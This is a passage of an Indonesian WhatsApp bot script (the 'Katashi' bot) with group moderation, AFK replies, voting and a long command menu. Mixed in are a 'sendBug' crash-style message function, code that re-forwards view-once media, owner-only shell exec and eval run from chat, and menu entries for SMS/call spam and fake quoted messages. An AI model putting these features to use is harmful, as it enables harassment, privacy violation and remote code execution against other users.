        syaa.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      syaa.groupAdd(from, orangnya);
    };
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await syaa.relayWAMessage(
        syaa.prepareMessageFromContent(
          target,
          syaa.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      syaa.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        syaa.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  syaa.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
      
      	    // Auto Read
        syaa.chatRead(from, "read")
        //auto vn 
        await syaa.updatePresence(from, Presence.recording)
        
        const sotoy = [
        'ðŸŠ : ðŸ’ : ðŸ',
        'ðŸ’ : ðŸ”” : ðŸŠ',
        'ðŸ‡ : ðŸ‡ : ðŸ',
        'ðŸŠ : ðŸ‹ : ðŸ””', //ANKER
        'ðŸ”” : ðŸ’ : ðŸ',
        'ðŸ”” : ðŸ’ : ðŸŠ',
        'ðŸŠ : ðŸ‹ : ðŸ””',        
        'ðŸ : ðŸ’ : ðŸ‹',
        'ðŸ : ðŸ’ : ðŸ',
        'ðŸŠ : ðŸ’ : ðŸ’',
        'ðŸ’ : ðŸ’ : ðŸ’ WinðŸ‘‘',
        'ðŸ”” : ðŸ”” : ðŸ‡',
        'ðŸŒ : ðŸŒ : ðŸ””',
        'ðŸ”” : ðŸ”” : ðŸ”” WinðŸ‘‘',
        'ðŸ : ðŸ”” : ðŸ””',
        'ðŸŠ : ðŸ‹ : ðŸ’',
        'ðŸ”” : ðŸ”” : ðŸ‡',
        'ðŸ”” : ðŸ‡ : ðŸ‡', 
        'ðŸ”” : ðŸ : ðŸ””','ðŸŠ : ðŸ’ : ðŸ','ðŸ’ : ðŸ”” : ðŸŠ','ðŸ‡ : ðŸ‡ : ðŸ‡ WinðŸ‘‘','ðŸŠ : ðŸ‹ : ðŸ””','ðŸ”” : ðŸ’ : ðŸ','ðŸ”” : ðŸ’ : ðŸŠ','ðŸŠ : ðŸ‹ : ðŸ””',	'ðŸ : ðŸ’ : ðŸ‹','ðŸ : ðŸ : ðŸ WinðŸ‘‘','ðŸŠ : ðŸ’ : ðŸ’','ðŸ”” : ðŸ”” : ðŸ‡','ðŸŒ : ðŸ’ : ðŸ””','ðŸ : ðŸ”” : ðŸ””','ðŸŠ : ðŸ‹ : ðŸ’','ðŸ‹ : ðŸ‹ : ðŸŒ','ðŸ”” : ðŸ”” : ðŸ‡','ðŸ”” : ðŸ : ðŸ‡','ðŸ’ : ðŸ’ : ðŸ’ WinðŸ‘‘','ðŸŒ : ðŸŒ : ðŸŒ WinðŸ‘‘']
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "âœ…",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "âŒ",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      syaa.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      syaa.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        syaa.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        syaa.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        syaa.groupRemove(from, [sender]);
      }
    }
    
    if (_chats.startsWith(">")) {
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      try {
        return syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(2)), null, "\t"),
          text,
          { quoted: mek }
        );
      } catch (err) {
        e = String(err);
        reply(e);
      }
    }
    if (budy.startsWith('$')){
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      const cod = args.join(' ')
      exec(cod, (err, stdout) => {
      if(err) return reply(`${err}`)
      if (stdout) {
      reply(`${stdout}`)
      }
      })
    }
    if (budy.startsWith('>')){
      if (!mek.key.fromMe) return
      try {
      return syaa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
      } catch(err) {
      e = String(err)
      reply(e)
      }
      }
      if (budy.startsWith('=>')){
      if (!isOwner && !mek.key.fromMe) return reply(mess.own)
      var konsol = budy.slice(3)
      var util = require("util")
      Return = (sul) => {
      var sat = JSON.stringify(sul, null, 2)
      bang = util.format(sat)
      if (sat == undefined){
      bang = util.format(sul)
      }
      return reply(bang)
      }
      try {
      reply(util.format(eval(`;(async () => { ${konsol} })()`)))
      console.log('\x1b[1;37m>', '[', '\x1b[1;32mEVAL\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      } catch(e){
      reply(String(e))
      }
      }
      
              // Runtime Di Bio Bang\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await syaa.setStatus(`Katashi Hana   Wib : ${jam}  Wita : ${wita}  Wit : ${wit}  `).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    
    if (!mek.key.fromMe && banChats === true) return;
    if (prefixStatus) if (_chats.startsWith(command)) return;
    switch (command) {
      case "infomenu":
        case "allmenu":
          case "menuall":
            if (isBanned) return reply(mess.ban)
        var menu = `${ucapanWaktu} kak *${pushname}*
        
â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹
*â¦¿ Jam :* ${jam}
*â¦¿ Hari :* ${week} ${weton}
*â¦¿ Tanggal :* ${date}
${readmore}â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹

_ada Bug?_ ketik ${prefix}report _Alasan_

*NEW FITUR*

*OWNER*
â€¢ ${prefix}off
â€¢ ${prefix}on
â€¢ ${prefix}status
â€¢ ${prefix}setthumb
â€¢ ${prefix}settarget
â€¢ ${prefix}shutdown
â€¢ ${prefix}hacked
â€¢ ${prefix}setfakeimg
â€¢ ${prefix}addprem @user
â€¢ ${prefix}dellprem @user
â€¢ ${prefix}ban @user
â€¢ ${prefix}unban @user
â€¢ ${prefix}setreply
â€¢ ${prefix}setprefix [2 Button]
â€¢ ${prefix}mode [2 Button self/public]
â€¢ ${prefix}term <code>
â€¢ ${prefix}eval <code>
â€¢ ${prefix}colongsw 
â€¢ ${prefix}readall
 $
 >
 =>
    
*GRUP*
â€¢ ${prefix}grup [3 Button]
â€¢ ${prefix}getpic @user
â€¢ ${prefix}promote <reply chat member>
â€¢ ${prefix}demote <reply chat member>
â€¢ ${prefix}setdesc
â€¢ ${prefix}setname
â€¢ ${prefix}kick <reply/tag member>
â€¢ ${prefix}add <reply/tag member>
â€¢ ${prefix}getbio <reply chat member>
â€¢ ${prefix}getname <reply chat member>
â€¢ ${prefix}reminder <msg/2s>
â€¢ ${prefix}listonline
â€¢ ${prefix}groupinfo
â€¢ ${prefix}linkgc
â€¢ ${prefix}sider [reply chat bot]
â€¢ ${prefix}antilink
â€¢ ${prefix}antihidetag
â€¢ ${prefix}antiviewonce
â€¢ ${prefix}antivirtex
â€¢ ${prefix}kickarea
â€¢ ${prefix}tagall _Text_
    
*MAKER*
â€¢ ${prefix}fdeface
â€¢ ${prefix}semoji
â€¢ ${prefix}wasted
â€¢ ${prefix}wanted
â€¢ ${prefix}pubglogo teks|teks
â€¢ ${prefix}deltrash
â€¢ ${prefix}squidrip
â€¢ ${prefix}sertiff1 <text>
â€¢ ${prefix}bpink <text>
â€¢ ${prefix}tulis
â€¢ ${prefix}googlem Text|Text
â€¢ ${prefix}roses
â€¢ ${prefix}wooden
â€¢ ${prefix}quote
â€¢ ${prefix}textburn
â€¢ ${prefix}card-game Judul|Keterangan
â€¢ ${prefix}tahta _Nama_
â€¢ ${prefix}halloween _Name_
â€¢ ${prefix}minion _Name_
â€¢ ${prefix}dance _Name_
â€¢ ${prefix}warrior _Name_
â€¢ ${prefix}text3d _Name_
â€¢ ${prefix}express
â€¢ ${prefix}spiderman
â€¢ ${prefix}matrix
â€¢ ${prefix}vampire
â€¢ ${prefix}remm _Name_
â€¢ ${prefix}lolim _Text_
â€¢ ${prefix}kaneki _Name_
â€¢ ${prefix}nuliskiri _Text_
â€¢ ${prefix}nuliskanan _Text_
â€¢ ${prefix}foliokiri _Text_
â€¢ ${prefix}foliokanan _Text_
â€¢ ${prefix}gfx _Text_
â€¢ ${prefix}gfx2 _Text|Text_
    
*MAKER CONVERT*
â€¢ ${prefix}spongebobm _ReplyGambar_
â€¢ ${prefix}hengkerm _ReplyGambar_
â€¢ ${prefix}hengkerm2 _ReplyGambar_
â€¢ ${prefix}ripm _ReplyGambar_
â€¢ ${prefix}stonkm _ReplyGambar_
â€¢ ${prefix}notstonkm _ReplyGambar_
â€¢ ${prefix}patrickm _ReplyGambar_
â€¢ ${prefix}narutobanner <query>
   
*FUN MENU*
â€¢ ${prefix}slot
â€¢ ${prefix}suit
â€¢ ${prefix}say _Text_
â€¢ ${prefix}bisakah _Querry_
â€¢ ${prefix}kapankah _Querry_
â€¢ ${prefix}apakah _Querry_
â€¢ ${prefix}belah _Querry_
â€¢ ${prefix}bagaimanakah _Querry_
â€¢ ${prefix}rate _Querry_
â€¢ ${prefix}caklontong
â€¢ ${prefix}sangecek _Name_
â€¢ ${prefix}gaycek _Name_
â€¢ ${prefix}terganteng
â€¢ ${prefix}tercantik
â€¢ ${prefix}lesbicek _Name_
â€¢ ${prefix}gantengcek _Name_
â€¢ ${prefix}cantikcek _Name_
â€¢ ${prefix}watak _Name_
â€¢ ${prefix}hobby _Name_
â€¢ ${prefix}jadian
â€¢ ${prefix}ngewe
â€¢ ${prefix}tod
â€¢ ${prefix}truth
â€¢ ${prefix}dare
â€¢ ${prefix}wangy _NamaMu_
â€¢ ${prefix}citacita
â€¢ ${prefix}katailham
â€¢ ${prefix}cekwatak
â€¢ ${prefix}cekmati _Text_

*STICKER MENU*
â€¢ ${prefix}bajingan lu _Text_
â€¢ ${prefix}sticker
â€¢ ${prefix}gay
â€¢ ${prefix}take Author|Pack
â€¢ ${prefix}swm Author|Pack
â€¢ ${prefix}attp _Text_
â€¢ ${prefix}ttp _Text_
â€¢ ${prefix}ttpblue _Text_
â€¢ ${prefix}ttpyellow _Text_
â€¢ ${prefix}ttpgreen _Text_
â€¢ ${prefix}stcmeme <query>
   
*CONVERT*
â€¢ ${prefix}toimg
â€¢ ${prefix}tomp3
â€¢ ${prefix}tomp4
â€¢ ${prefix}slow
â€¢ ${prefix}fast
â€¢ ${prefix}reverse
â€¢ ${prefix}tourl
â€¢ ${prefix}toimg2
â€¢ ${prefix}tomp42

*ISLAM MENU*
â€¢ ${prefix}listdaerah
â€¢ ${prefix}randomquran _Text_
â€¢ ${prefix}surah <query>
â€¢ ${prefix}quotesislam
â€¢ ${prefix}kisahnabi <query>
    
*DOWNLOADER*
â€¢ ${prefix}youtube <url>
â€¢ ${prefix}ytmp3 <url>
â€¢ ${prefix}ytmp4 <url>
â€¢ ${prefix}tiktok <url>
â€¢ ${prefix}instagram <url>
â€¢ ${prefix}twitter <url>
â€¢ ${prefix}soundcloud* [url]
â€¢ ${prefix}dafontdownload _Link_
â€¢ ${prefix}xvideo _Link_
â€¢ ${prefix}xs _Text_
â€¢ ${prefix}xs2 _Text_
â€¢ ${prefix}xnxx _Link_
â€¢ ${prefix}twitter <link>
â€¢ ${prefix}tiktok <link>
â€¢ ${prefix}tiktok2 <link>
â€¢ ${prefix}tiktokaudio <link>
â€¢ ${prefix}fb <link>
â€¢ ${prefix}play <query>
â€¢ ${prefix}video <query>
â€¢ ${prefix}spotify
â€¢ ${prefix}nhentaipdf <kode>
â€¢ ${prefix}ytmp42 <query>

*UP STORY*
â€¢ ${prefix}upswteks
â€¢ ${prefix}upswimage
â€¢ ${prefix}upswvideo
â€¢ ${prefix}upswvoice
â€¢ ${prefix}upswgif
â€¢ ${prefix}upswaudio
â€¢ ${prefix}upswsticker

*STORAGE MENU*
â€¢ ${prefix}addvn _Nama_
â€¢ ${prefix}addvideo _Nama_
â€¢ ${prefix}addsticker _Nama_
â€¢ ${prefix}addimage _Nama_
â€¢ ${prefix}listvn
â€¢ ${prefix}listvideo
â€¢ ${prefix}liststicker
â€¢ ${prefix}listimg
â€¢ ${prefix}getvn _Database_
â€¢ ${prefix}getvideo _Database_
â€¢ ${prefix}getsticker _Database_
â€¢ ${prefix}getimage _Database_
    
*FUN*
â€¢ ${prefix}fitnah
â€¢ ${prefix}fitnahpc
â€¢ ${prefix}kontak
â€¢ ${prefix}katashi _Text_
â€¢ ${prefix}putra _Text_
â€¢ ${prefix}simi _Text_
    
*TAG*
â€¢ ${prefix}hidetag
â€¢ ${prefix}kontag
â€¢ ${prefix}sticktag
â€¢ ${prefix}totag
    
*OTHER*
â€¢ ${prefix}shortlink _Link_
â€¢ ${prefix}wikipedia _Querry_
â€¢ ${prefix}asupan
â€¢ ${prefix}ocr
â€¢ ${prefix}asupan2
â€¢ ${prefix}tts id _Text_
â€¢ ${prefix}polosanmeme
â€¢ ${prefix}virtex
â€¢ ${prefix}memeindo
â€¢ ${prefix}detikvn <ReplyVn|Jumlah>
â€¢ ${prefix}detikvideo <ReplyVid|Jumlah>
â€¢ ${prefix}delete
â€¢ ${prefix}infogempa
â€¢ ${prefix}dadu
â€¢ ${prefix}tospam _Jumlah_
â€¢ ${prefix}ping
â€¢ ${prefix}inspect
â€¢ ${prefix}join
â€¢ ${prefix}caripesan <query>
â€¢ ${prefix}get
â€¢ ${prefix}urlshort _Link_
â€¢ ${prefix}urlshort2 _Text_
â€¢ ${prefix}brainly <query>
â€¢ ${prefix}image <query>
â€¢ ${prefix}anime <random>
â€¢ ${prefix}pinterest <query>
â€¢ ${prefix}komiku <query>
â€¢ ${prefix}lirik <query>
â€¢ ${prefix}chara <query>
â€¢ ${prefix}playstore <query>
â€¢ ${prefix}otaku <query>
â€¢ ${prefix}tokohindo
â€¢ ${prefix}renungan
â€¢ ${prefix}animeindo (text)
â€¢ ${prefix}kodepos2 (text) 
â€¢ ${prefix}gabut 

*INFORMATION MENU*
â€¢ ${prefix}cuacabandara
â€¢ ${prefix}cuaca1 <_Nama Daerah_>
â€¢ ${prefix}cuaca <_Nama Daerah>
â€¢ ${prefix}rscovid
â€¢ ${prefix}jadwalbola 
â€¢ ${prefix}jadwaltvnow 
â€¢ ${prefix}trendingtwitter
â€¢ ${prefix}mostviewfilm
â€¢ ${prefix}infoloker
â€¢ ${prefix}datasekolah <query>
â€¢ ${prefix}datasekolah2 <query>

*SEARCH MENU*
â€¢ ${prefix}ytsearch <query>
â€¢ ${prefix}carimasakna _masakanya_
â€¢ ${prefix}thelazy _Text_
â€¢ ${prefix}palingmurah (text)
â€¢ ${prefix}sfilesearch (text)
â€¢ ${prefix}ytstalk (channel)
â€¢ ${prefix}happymod <text>
â€¢ ${prefix}film <text>
â€¢ ${prefix}ytplaylist <text>
â€¢ ${prefix}ytchannel <text> 
â€¢ ${prefix}jav (text)
â€¢ ${prefix}phsearch (text)
â€¢ ${prefix}chord _Text_
â€¢ ${prefix}nekopoirandom
â€¢ ${prefix}nekopoisearch
â€¢ ${prefix}ytstalk _Text_ 
â€¢ ${prefix}jooxsearch <query>
â€¢ ${prefix}pesantren <id>
â€¢ ${prefix}kabupaten <id>
â€¢ ${prefix}provinsi 
â€¢ ${prefix}kusonime <query>
â€¢ ${prefix}samehadaku <query>
â€¢ ${prefix}dafontsearch <query>
â€¢ ${prefix}jarak <query>
â€¢ ${prefix}nhentaisearch <query>
â€¢ ${prefix}komiku <query>

*SPAM MENU*
â€¢ ${prefix}spamsms <89xnxx>
â€¢ ${prefix}spamcall <89xnxx>

*NEWS MENU*
â€¢ ${prefix}cnn 
â€¢ ${prefix}kompastv
â€¢ ${prefix}tribunnews
â€¢ ${prefix}liputan
â€¢ ${prefix}foxnews

*STALK MENU*
â€¢ ${prefix}igstalk <query>
â€¢ ${prefix}githubstalk <query>
â€¢ ${prefix}tiktokstalk <query>
â€¢ ${prefix}igstory <username>
    
*RANDOM IMAGE*
â€¢ ${prefix}darkjoke
â€¢ ${prefix}cecan
â€¢ ${prefix}cogan
â€¢ ${prefix}hentai
â€¢ ${prefix}quotes
â€¢ ${prefix}kucing
â€¢ ${prefix}squidward
â€¢ ${prefix}spongebob
â€¢ ${prefix}patrick
â€¢ ${prefix}minato
â€¢ ${prefix}kakashi
â€¢ ${prefix}boruto
â€¢ ${prefix}sarada
â€¢ ${prefix}mitsuki
â€¢ ${prefix}sasuke
â€¢ ${prefix}sakura
â€¢ ${prefix}itachi
â€¢ ${prefix}megumin
â€¢ ${prefix}loli
â€¢ ${prefix}husbu
â€¢ ${prefix}wafiu
â€¢ ${prefix}wallpaperanime
â€¢ ${prefix}naruto
â€¢ ${prefix}aesthetic
â€¢ ${prefix}bts
â€¢ ${prefix}blackpink
â€¢ ${prefix}ppcp
â€¢ ${prefix}quotesyt

*RANDOM TEXT*
â€¢ ${prefix}randombokep
â€¢ ${prefix}style (text)
â€¢ ${prefix}pastebin (text)
â€¢ ${prefix}nickepep
â€¢ ${prefix}fake
â€¢ ${prefix}twich
â€¢ ${prefix}cersex
â€¢ ${prefix}cerpen
â€¢ ${prefix}katacinta
â€¢ ${prefix}tongue
â€¢ ${prefix}renungan
â€¢ ${prefix}randomcerpen 

*JADI BOT*
â€¢ ${prefix}jadibot
â€¢ ${prefix}stopjadibot
â€¢ ${prefix}listbot

*STICKER CMD*
â€¢ ${prefix}addcmd
â€¢ ${prefix}delcmd
â€¢ ${prefix}listcmd
    
*VOTE*
â€¢ ${prefix}voting
â€¢ ${prefix}delvote
 vote
 devote

*_THANKS BUAT_*
===================
- _AFFIS JUNIANTO_
- _RAFLI RUSDIANA_
- _YOGI PW_
- _MEGUMIN_
- _MANIK_
- _WISNU_
- _DAPPA_
- _MHANK BAR BAR_
- _BAILEYS_
- _ARASYA_
- _PUTRA_

 *INFO BOT*
â€¢ Prefix : ã€Œ ${prefixStatus ? "Multi Prefix" : "No Prefix"} ã€
â€¢ Runtime : ${runtime(process.uptime())}
â€¢ Hit Today : ${hit_today.length} Hit
â€¢ Total Hit : ${totalhit} Hit
â€¢ Total Chat : ${totalchat.length} Chat

`;
        sendButImage(from, menu, "by @k4t4sh1._ â¤ï¸", thumb, [
          {
            buttonId: `${prefix}donasi`,
            buttonText: {
              displayText: `DonasiðŸ’°`,
            },
            type: 1,
          },
                    {
            buttonId: `${prefix}scKATASHIbot`,
            buttonText: {
              displayText: `ScKATASHIBot`,
            },
            type: 1,
          },
        ]);

        break;
        case 'leave':
          if (isBanned) return reply(mess.ban)
             if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
                setTimeout( () => {
                syaa.groupLeave (from) 
                }, 2000)
                setTimeout( () => {
                syaa.updatePresence(from, Presence.composing) 
                syaa.sendMessage(from, 'Bye cukðŸ—£', text) // ur cods
                }, 0)
                break
        case 'tagall':
          if (isBanned) return reply(mess.ban)
              if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
				    
        case "menu":
          case "m":
          case "help":
            if (isBanned) return reply(mess.ban)
        var menu = `Halloo ${pushname} Aku ${namabot}

â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹
 *INFO OWNER*
 ðŸ“§ Instagram : https://instagram.com/${instagram}
 ðŸª€ Whatsapp : https://wa.me/${owner}
 ðŸ“Œ Youtube : ${yt}
 
*${prefix}sticker*
*${prefix}owner*
*${prefix}info*

â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹
 
 Join Grup ${namabot}!
 
 ${grupct}

â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹
 *INFO BOT KATASHI*
â€¢ Prefix : ã€Œ ${prefixStatus ? "Multi Prefix" : "No Prefix"} ã€
â€¢ Runtime : ${runtime(process.uptime())}
â€¢ Hit Today : ${hit_today.length} Hit
â€¢ Total Hit : ${totalhit} Hit
â€¢ Total Chat : ${totalchat.length} Chat
â‹â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‹
`;
        sendButImage(from, menu, "ALLERTâš ï¸\n\nJIKA ANDA MEMAKAI WHATSAPP MOD DAN TOMBOL DIBAWAH TIDAK TERLIHAT\nSILAHKAN KETIK /allmenu", thumb, [
          {
            buttonId: `${prefix}infomenu`,
            buttonText: {
              displayText: `â‹®â˜° Semua Menu`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `â‹®â˜° Pemilik Bot`,
            },
            type: 1,
          },
        {
            buttonId: `${prefix}peraturan2`,
            buttonText: {
              displayText: `Syarat & KetentuanðŸ“Œ`,
            },
            type: 1,
          },
        ]);
        break;
        
      case "owner":
        sendKontak(from, owner, `${nama_owner}`, `Pemilik ${namabot}`);
        sendButMessage(
          from,
          `Mau tanyaÂ² tentang apa?`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}scKATASHIbot`,
              buttonText: {
                displayText: `SCRIPT`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}igstalk k4t4sh1._`,
              buttonText: {
                displayText: `INSTAGRAM`,
              },
              type: 1,
            },
          ]
        );
        break;
        break;
        case "grupchat":
          reply("https://chat.whatsapp.com/H5JPkwbob5YH8x5Mpcxybm")
          break;
        if (body.startsWith(`p`)) {
                  reply(`Salam dong sayang`)
                }
        case "peraturan":
        reply("By @k4t4sh1._\n\nPergunakan Bot Dengan Baik Dan Bijak!!!\n- Jangan Spam Dan Jangan Telepon Bot!!!\n- Silahkan Hubungi Owner Jika Bot Mengalama Kendala!!\n- Jangan Paksakan Bot Masuk Ke Grup Kamu!!!\n- <> TIDAK DI ANGGAP!!\n\nOkee ThanksðŸ—¿");
        break;
        case "hina":
          reply("apa lu anjingðŸ˜¡")
          break;
        
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
